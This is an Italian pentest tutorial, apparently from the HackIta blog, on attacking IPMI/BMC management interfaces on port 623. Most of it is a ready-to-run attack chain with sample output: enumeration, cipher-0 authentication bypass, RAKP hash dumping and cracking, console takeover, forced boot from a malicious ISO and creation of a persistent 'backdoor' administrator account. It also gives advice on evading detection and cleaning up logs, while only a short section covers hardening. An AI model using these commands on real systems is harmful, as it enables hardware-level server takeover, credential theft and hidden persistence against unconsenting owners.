---
title: 'Porta 623 IPMI: RAKP hash disclosure, cipher 0 e rischio BMC out-of-band.'
slug: porta-623-ipmi
description: >-
  Scopri cos’è la porta 623/UDP asf-rmcp, come funziona IPMI 2.0 con RAKP e
  perché la CVE-2013-4786 consente il recupero di hash dalle risposte del BMC,
  mentre il supporto a cipher suite 0 può ridurre drasticamente la sicurezza del
  management remoto.
image: /porta-623-ipmi.webp
draft: false
date: 2026-04-06T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - rakp-hash
  - cipher-zero
---

> **Executive Summary** — La porta 623 IPMI espone l'Intelligent Platform Management Interface, il sistema di management out-of-band dei server fisici (BMC). IPMI 2.0 ha una vulnerabilità a livello di specifica (CVE-2013-4786): durante il handshake RAKP, il BMC invia l'hash della password a qualsiasi client — senza autenticazione. Questa falla non è patchabile perché è nel design del protocollo. Con l'hash crackato, il pentester ottiene accesso completo al server: KVM console, virtual media, power control. Questa guida copre hash extraction, cipher 0 bypass, credenziali default e post-exploitation BMC.

```id="t7k3lp"
TL;DR

- IPMI 2.0 invia l'hash della password a chiunque lo chieda — è una flaw di design, non un bug, non sarà mai patchata
- Cipher suite 0 significa "nessuna autenticazione": qualsiasi password funziona, serve solo un username valido
- Un BMC compromesso dà controllo totale del server: KVM, reboot, mount ISO, accesso al BIOS — sopravvive anche alla reinstallazione dell'OS

```

Porta 623 IPMI è il canale UDP su cui i Baseboard Management Controller (BMC) ricevono comandi di management out-of-band per i server fisici. La porta 623 vulnerabilità più critica è la RAKP hash disclosure (CVE-2013-4786): il protocollo IPMI 2.0 invia l'hash HMAC-SHA1 della password a qualsiasi client remoto senza autenticazione. L'enumerazione porta 623 rivela versione IPMI, vendor del BMC, cipher suite supportate e utenti configurati. Nel IPMI pentest, l'hash extraction è quasi sempre il primo passo — e con GPU moderne, il cracking è questione di minuti. Nella kill chain si posiziona come initial access → full server compromise, perché il BMC opera a livello hardware, sotto l'OS.

## 1. Anatomia Tecnica della Porta 623

La porta 623 è registrata IANA come `asf-rmcp` su UDP. IPMI usa il protocollo RMCP (Remote Management and Control Protocol) e la sua variante cifrata RMCP+ per la comunicazione con il BMC.

Il flusso IPMI 2.0 (RMCP+):

1. Client invia **Get Channel Auth Capabilities** — il BMC risponde con i metodi di autenticazione supportati
2. Client avvia il handshake **RAKP** (Remote Authenticated Key Exchange Protocol)
3. Nel **RAKP Message 2**, il BMC invia un HMAC-SHA1 dell'username e della password — **a qualsiasi client, senza autenticazione previa**
4. Il client verifica l'HMAC e completa il handshake
5. Sessione stabilita con i privilegi dell'utente

Il BMC è un processore indipendente con la propria interfaccia di rete, che opera anche a server spento. I principali vendor sono Dell (iDRAC), HP/HPE (iLO), Supermicro (IPMI/BMC), Lenovo (IMM/XCC), Oracle (ILOM).

```
Misconfig: IPMI esposto su rete non segmentata
Impatto: qualsiasi host sulla rete può estrarre hash delle password BMC
Come si verifica: nmap -sU -p 623 [subnet] — se risponde da VLAN utenti, è esposto
```

```
Misconfig: Cipher suite 0 abilitato (default su molti BMC)
Impatto: autenticazione completamente bypassata — qualsiasi password funziona
Come si verifica: nmap -sU --script ipmi-cipher-zero -p 623 [target]
```

```
Misconfig: Credenziali BMC default non cambiate
Impatto: accesso completo al BMC con credenziali note per vendor
Come si verifica: ipmitool -I lanplus -H [target] -U ADMIN -P ADMIN user list
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sU -p 623 -sV --script ipmi-version 10.10.10.0/24
```

**Output atteso:**

```
PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
| ipmi-version:
|   Version: IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null
|_  Level: Administrator
```

**Parametri:**

* `-sU`: scan UDP (IPMI è UDP)
* `--script ipmi-version`: identifica versione IPMI e metodi di auth
* `-p 623`: porta BMC

**Cosa ci dice questo output:** IPMI 2.0 attivo con autenticazione password, MD5 e MD2. `null` nelle UserAuth indica che cipher 0 potrebbe essere supportato. `Level: Administrator` conferma che l'accesso admin è raggiungibile. Questo BMC è vulnerabile alla RAKP hash disclosure per design.

### Comando 2: ipmitool

```bash
ipmitool -I lanplus -H 10.10.10.50 -U "" -P "" chassis status
```

**Output atteso (null auth):**

```
System Power         : on
Power Overload       : false
Power Interlock      : inactive
Main Power Fault     : false
Power Control Fault  : false
```

**Output atteso (auth richiesta):**

```
Error: Unable to establish IPMI v2.0 / RMCP+ session
Get Session Challenge command failed
```

**Cosa ci dice questo output:** se risponde senza credenziali, il BMC ha autenticazione nulla — accesso completo senza password. Se rifiuta, serve estrarre hash o testare credenziali default.

## 3. Enumerazione Avanzata

### Cipher 0 detection

```bash
nmap -sU -p 623 --script ipmi-cipher-zero 10.10.10.50
```

**Output (vulnerabile):**

```
| ipmi-cipher-zero:
|   VULNERABLE:
|   IPMI 2.0 Cipher Zero Authentication Bypass
|     State: VULNERABLE
|_    Risk: HIGH - Any password accepted with cipher suite 0
```

**Output (non vulnerabile):**

```
| ipmi-cipher-zero:
|   NOT VULNERABLE
```

**Lettura dell'output:** cipher 0 = nessuna autenticazione. Qualsiasi password funziona. Serve solo un username valido (quasi sempre `ADMIN`, `admin`, `root`). Per capire l'impatto completo, consulta la [guida al privilege escalation](https://hackita.it/articoli/privilege-escalation).

### Sfruttamento cipher 0

```bash
ipmitool -I lanplus -C 0 -H 10.10.10.50 -U ADMIN -P qualsiasi user list
```

**Output:**

```
ID  Name       Callin  Link Auth  IPMI Msg   Channel Priv Limit
1   ADMIN      true    true       true       ADMINISTRATOR
2   backup     true    true       true       USER
3                      false      false      NO ACCESS
```

**Lettura dell'output:** con cipher 0, la password `qualsiasi` è stata accettata. Due utenti attivi: `ADMIN` (administrator) e `backup` (user). Puoi cambiare la password di qualsiasi utente: `ipmitool -I lanplus -C 0 -H 10.10.10.50 -U ADMIN -P x user set password 1 NuovaPassword123`.

### RAKP hash extraction (Metasploit)

```bash
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.50
set OUTPUT_HASHCAT_FILE /tmp/ipmi_hashes.txt
run
```

**Output:**

```
[+] 10.10.10.50:623 - IPMI - Hash found: ADMIN:a1b2c3d445000000...
[+] 10.10.10.50:623 - IPMI - Hash found: backup:e6f7890ab1200000...
[*] Scanned 1 of 1 hosts (100% complete)
[*] Hash(es) written to /tmp/ipmi_hashes.txt
```

**Lettura dell'output:** hash HMAC-SHA1 estratti per entrambi gli utenti — senza aver fornito alcuna password. Questo è il cuore della vulnerabilità IPMI 2.0: il BMC invia l'hash a chiunque ne faccia richiesta. Per il cracking massivo degli hash, scopri le [tecniche di password cracking con hashcat](https://hackita.it/articoli/bruteforce).

## 4. Tecniche Offensive

**Cracking hash IPMI con hashcat**

Contesto: hash RAKP estratti con Metasploit. Hashcat mode 7300 per IPMI 2.0.

```bash
hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Output (successo):**

```
a1b2c3d445000000...:ADMIN:SuperMicro2025!
e6f7890ab1200000...:backup:Backup123
```

**Output (fallimento):**

```
Exhausted
```

**Cosa fai dopo:** password crackate. Accedi al BMC con le credenziali per controllo totale del server: KVM, reboot, virtual media. Testa le stesse password su SSH, RDP e altri servizi del server — password reuse tra BMC e OS è molto comune.

**Accesso KVM console via BMC web**

Contesto: hai credenziali BMC valide (da cracking o default). Vuoi accesso visivo al server.

```bash
# Accedi via browser all'interfaccia web del BMC
# Dell iDRAC: https://10.10.10.50
# HP iLO:     https://10.10.10.50
# Supermicro: https://10.10.10.50

# Via ipmitool: Serial-over-LAN
ipmitool -I lanplus -H 10.10.10.50 -U ADMIN -P SuperMicro2025! sol activate
```

**Output (successo):**

```
[SOL Session operational. Use ~. to quit]
login:
```

**Cosa fai dopo:** sei sulla console del server. Se c'è un login prompt, puoi tentare credenziali. Se è un server Windows, vedi la schermata di login. Il KVM via web dà anche accesso a mouse e tastiera — puoi interagire come se fossi fisicamente davanti al server.

**Virtual media — boot da ISO malevolo**

Contesto: vuoi accesso completo al disco del server. Monti un ISO di boot (es: live Linux) e riavvii.

```bash
ipmitool -I lanplus -H 10.10.10.50 -U ADMIN -P SuperMicro2025! chassis bootdev cdrom
ipmitool -I lanplus -H 10.10.10.50 -U ADMIN -P SuperMicro2025! chassis power cycle
```

**Output (successo):**

```
Set Boot Device to cdrom
Chassis Power Control: Cycle
```

**Cosa fai dopo:** il server si riavvia dal CD virtuale (montato tramite l'interfaccia web BMC come ISO remoto). Con una live Linux, monti il disco del server e accedi a tutti i file — inclusi SAM/SYSTEM per Windows o /etc/shadow per Linux. Questo attacco è **devastante** e sopravvive alla reinstallazione dell'OS.

**Backdoor account persistente**

Contesto: vuoi persistenza a livello BMC che sopravvive a reinstallazione OS, formattazione disco, cambio hardware.

```bash
ipmitool -I lanplus -H 10.10.10.50 -U ADMIN -P SuperMicro2025! user set name 4 backdoor
ipmitool -I lanplus -H 10.10.10.50 -U ADMIN -P SuperMicro2025! user set password 4 B4ckd00r!
ipmitool -I lanplus -H 10.10.10.50 -U ADMIN -P SuperMicro2025! user priv 4 4
ipmitool -I lanplus -H 10.10.10.50 -U ADMIN -P SuperMicro2025! user enable 4
```

**Output:**

```
Set User Name (id:4) to backdoor
Set User Password (id:4)
Set Privilege Level (id:4) to ADMINISTRATOR
```

**Cosa fai dopo:** l'account `backdoor` persiste nel BMC indipendentemente dall'OS. Anche se il cliente reinstalla il server, il tuo accesso rimane. Nel report, documenta come persistence finding critico.

## 5. Scenari Pratici di Pentest

### Scenario 1: Datacenter con BMC su rete flat

**Situazione:** datacenter dove le interfacce BMC sono sulla stessa VLAN della rete di management. Hai accesso interno.

**Step 1:**

```bash
nmap -sU -p 623 --script ipmi-version 10.10.10.0/24
```

**Output atteso:**

```
10.10.10.50-60 - 623/udp open asf-rmcp (IPMI-2.0)
```

**Step 2:**

```bash
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.10.50-60; run"
```

**Step 3:**

```bash
hashcat -m 7300 hashes.txt rockyou.txt
```

**Se fallisce:**

* Causa probabile: password complesse non in dizionario
* Fix: usa regole hashcat (`-r best64.rule`), o prova cipher 0 prima

**Tempo stimato:** 15-60 minuti (scan + extract + crack)

### Scenario 2: Server Supermicro con credenziali default

**Situazione:** server Supermicro nuovo, credenziali BMC mai cambiate.

**Step 1:**

```bash
ipmitool -I lanplus -H 10.10.10.50 -U ADMIN -P ADMIN user list
```

**Output atteso:**

```
ID  Name       Callin  Link Auth  IPMI Msg   Channel Priv Limit
1   ADMIN      true    true       true       ADMINISTRATOR
```

**Step 2:**

```bash
# Accedi alla web interface
# https://10.10.10.50 — login ADMIN:ADMIN
# Apri KVM console via browser
```

**Se fallisce:**

* Causa probabile: credenziali cambiate
* Fix: estrai hash RAKP e cracka. Su Supermicro pre-2019, prova anche `ADMIN:ADMIN` tutto maiuscolo

**Tempo stimato:** 2-5 minuti con credenziali default

### Scenario 3: Dell iDRAC esposto

**Situazione:** assessment interno. iDRAC su rete separata ma raggiungibile.

**Step 1:**

```bash
nmap -sU -p 623 --script ipmi-version,ipmi-cipher-zero 10.10.20.0/24
```

**Step 2:**

```bash
# Dell default: root:calvin
ipmitool -I lanplus -H 10.10.20.50 -U root -P calvin chassis status
```

**Se fallisce:**

* Causa probabile: iDRAC 9+ richiede cambio password al primo login
* Fix: estrai hash con Metasploit, cracka, poi prova via web HTTPS sulla stessa IP

**Tempo stimato:** 5-15 minuti

## 6. Attack Chain Completa

| Fase         | Tool     | Comando chiave                             | Output/Risultato    |
| ------------ | -------- | ------------------------------------------ | ------------------- |
| Recon        | nmap     | `nmap -sU -p 623 --script ipmi-version`    | BMC attivi          |
| Cipher 0     | nmap     | `--script ipmi-cipher-zero`                | Auth bypass         |
| Hash Extract | msf      | `ipmi_dumphashes`                          | Hash RAKP           |
| Crack        | hashcat  | `hashcat -m 7300 hashes.txt wordlist`      | Password            |
| Access       | ipmitool | `ipmitool -I lanplus -H [IP] sol activate` | Console server      |
| Persistence  | ipmitool | `user set name 4 backdoor`                 | Account persistente |

**Timeline stimata:** 15-60 minuti dalla discovery al controllo totale del server.

**Ruolo della porta 623:** è la porta del "dio del server". Chi controlla il BMC controlla l'hardware — sotto l'OS, sotto il disco, sotto tutto.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **BMC log**: tentativi di autenticazione e nuovi utenti creati
* **IDS**: traffico IPMI da subnet non autorizzate
* **NMS**: alert su RAKP handshake da sorgenti sconosciute

### Tecniche di Evasion

```
Tecnica: Singolo hash extraction per target
Come: estrai l'hash di un solo utente (tipicamente ADMIN) — non dumpare tutti
Riduzione rumore: un singolo RAKP handshake è meno visibile di un dump massivo
```

```
Tecnica: Usa cipher 0 prima del hash cracking
Come: se cipher 0 è abilitato, non serve nemmeno l'hash — accesso immediato
Riduzione rumore: zero tentativi di cracking, nessun handshake RAKP
```

### Cleanup

* Rimuovi account backdoor: `ipmitool user set name 4 ""`
* I log BMC sono limitati e spesso sovrascrivibili: verifica con `ipmitool sel list`
* La password crackata non genera log — il RAKP handshake è un'operazione normale

## 8. Toolchain e Confronto

| Aspetto     | IPMI (623/UDP)   | iDRAC web (443) | iLO web (443)  | Redfish API (443) |
| ----------- | ---------------- | --------------- | -------------- | ----------------- |
| Porta       | 623/UDP          | 443/TCP         | 443/TCP        | 443/TCP           |
| Auth bypass | Cipher 0         | CVE-specifiche  | CVE-specifiche | CVE-2024-54085    |
| Hash leak   | RAKP (by design) | No              | No             | No                |
| Cracking    | hashcat -m 7300  | N/A             | N/A            | N/A               |
| KVM         | Sì (SOL/web)     | Sì (web)        | Sì (web)       | No (API only)     |

## 9. Troubleshooting

| Errore / Sintomo                                           | Causa                           | Fix                                                                     |
| ---------------------------------------------------------- | ------------------------------- | ----------------------------------------------------------------------- |
| 623/udp filtered                                           | Firewall blocca IPMI            | BMC su VLAN separata — serve accesso a quella VLAN                      |
| `ipmi_dumphashes` no hash                                  | Username non valido o IPMI 1.5  | Prova username comuni: ADMIN, admin, root, Administrator                |
| [hashcat](https://hackita.it/articoli/hashcat) `Exhausted` | Password complessa              | Aggiungi regole: `hashcat -m 7300 -r best64.rule` o custom mask         |
| `Unable to establish session`                              | IPMI 1.5 (non supporta RAKP)    | RAKP funziona solo su IPMI 2.0 — testa credenziali default direttamente |
| SOL timeout                                                | Serial-over-LAN non configurato | Accedi via web interface del BMC per KVM                                |

## 10. FAQ

**D: Come funziona la vulnerabilità RAKP di IPMI 2.0?**

R: Durante il handshake RAKP, il BMC invia un hash HMAC-SHA1 della password dell'utente nel Message 2, prima che il client si sia autenticato. Qualsiasi attacker sulla rete può richiedere questo hash e crackarlo offline. È un difetto di design del protocollo, non un bug software.

**D: Porta 623 è TCP o UDP?**

R: Principalmente [UDP](https://hackita.it/articoli/udp). IPMI usa RMCP su UDP 623 per il canale di management. Alcuni BMC espongono anche servizi [TCP](https://hackita.it/articoli/tcp) sulla stessa porta per funzionalità aggiuntive.

**D: Cosa significa cipher suite 0?**

R: Cipher 0 nel protocollo IPMI 2.0 specifica "nessuna autenticazione e nessuna cifratura". Se abilitato, il BMC accetta qualsiasi password — serve solo un username valido per ottenere accesso completo.

**D: Le credenziali BMC default sono ancora un problema nel 2026?**

R: Sì. Dell iDRAC default `root:calvin` e Supermicro `ADMIN:ADMIN` sono ancora frequentissimi. HP iLO usa password randomizzate stampate sulla scheda del server — più sicuro ma la password è leggibile fisicamente.

**D: Come proteggere IPMI sulla porta 623?**

R: Isola i BMC su una VLAN di management dedicata con ACL restrittive. Cambia credenziali default. Disabilita cipher 0. Aggiorna il firmware BMC regolarmente. Se possibile, disabilita IPMI over LAN e usa solo l'interfaccia web via HTTPS.

## 11. Cheat Sheet Finale

| Azione         | Comando                                                               | Note               |
| -------------- | --------------------------------------------------------------------- | ------------------ |
| Scan BMC       | `nmap -sU -p 623 --script ipmi-version [subnet]`                      | UDP scan           |
| Cipher 0 check | `nmap -sU -p 623 --script ipmi-cipher-zero [target]`                  | Auth bypass        |
| Default creds  | `ipmitool -I lanplus -H [IP] -U ADMIN -P ADMIN user list`             | Supermicro         |
| Default Dell   | `ipmitool -I lanplus -H [IP] -U root -P calvin chassis status`        | iDRAC              |
| Hash extract   | `msf > use auxiliary/scanner/ipmi/ipmi_dumphashes`                    | Senza auth         |
| Crack hash     | `hashcat -m 7300 hashes.txt wordlist.txt`                             | \~970 MH/s GPU     |
| Cipher 0 abuse | `ipmitool -I lanplus -C 0 -H [IP] -U ADMIN -P x user list`            | Qualsiasi password |
| SOL console    | `ipmitool -I lanplus -H [IP] -U [user] -P [pass] sol activate`        | Console server     |
| Boot ISO       | `ipmitool ... chassis bootdev cdrom && chassis power cycle`           | Boot malevolo      |
| Add backdoor   | `ipmitool ... user set name 4 backdoor && user set password 4 [pass]` | Persistenza        |

### Perché Porta 623 è rilevante nel 2026

IPMI è presente su ogni server fisico enterprise. La RAKP hash disclosure è una flaw di design che non sarà mai corretta — funziona su qualsiasi BMC con IPMI 2.0, indipendentemente dal vendor. CVE-2024-54085 (AMI MegaRAC auth bypass, CVSS 10.0) è stata aggiunta al catalogo KEV di CISA nel 2025. Le credenziali BMC default non vengono cambiate nella maggioranza delle installazioni. Un BMC compromesso dà accesso a livello hardware che sopravvive a qualsiasi operazione software.

### Hardening e Mitigazione

* Isola BMC su VLAN di management dedicata — mai sulla rete utenti o server
* Cambia credenziali default su ogni BMC durante il provisioning
* Disabilita cipher suite 0: dipende dal vendor (BIOS/firmware setting)
* Aggiorna firmware BMC regolarmente (AMI MegaRAC, Dell iDRAC, HP iLO)
* Monitora accessi IPMI con SIEM — log BMC verso syslog centrale

### OPSEC per il Red Team

L'hash extraction RAKP è una singola richiesta UDP — profilo bassissimo. Il cracking è offline, zero rumore. Cipher 0 non genera log di auth failure. L'accesso via ipmitool è loggato nel BMC SEL (System Event Log) ma spesso non monitorato. Per massima stealth: estrai hash da un solo BMC, cracka offline, poi muoviti verso altri server testando password reuse. La backdoor BMC è la persistenza più duratura possibile — sopravvive a reinstallazione OS e formattazione disco.

***

Tutti i comandi e le tecniche sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto, lab, CTF. Riferimento: IPMI 2.0 Specification, CVE-2013-4786, CVE-2024-54085. Approfondimento: [https://www.speedguide.net/port.php?port=623](https://www.speedguide.net/port.php?port=623)

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
